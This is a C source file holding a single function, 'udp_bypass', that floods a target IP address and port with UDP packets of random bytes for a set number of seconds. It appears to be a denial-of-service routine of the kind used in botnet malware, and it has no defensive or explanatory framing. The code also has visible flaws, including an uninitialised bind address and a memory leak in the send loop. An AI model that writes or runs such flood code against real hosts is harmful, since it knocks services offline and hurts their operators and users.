#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

void udp_bypass(char *target, uint16_t port, int secs)
{
    struct sockaddr_in bypass;
    int fds = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    bind(fds, (struct sockaddr *)&bypass, sizeof(bypass));

    bypass.sin_family = AF_INET;
    bypass.sin_port = htons(port);
    bypass.sin_addr.s_addr = inet_addr(target);

    time_t start = time(NULL);
    connect(fds, (struct sockaddr *)&bypass, sizeof(bypass));

    while(1)
    {
        uint16_t size = 0;
        int a = 0;
        char *data;
        size = 1024 + rand() % (1460 - 1024);
        data = (char *)malloc(size);

        for (a = 0; a < size; a++)
        {
            data[a] = (char)(rand() & 0xFFFF);
        }
        send(fds, data, size, MSG_NOSIGNAL);
        if(time(NULL) >= start + secs)
        {
            close(fds);
            free(data);
            return;
        }
    }
}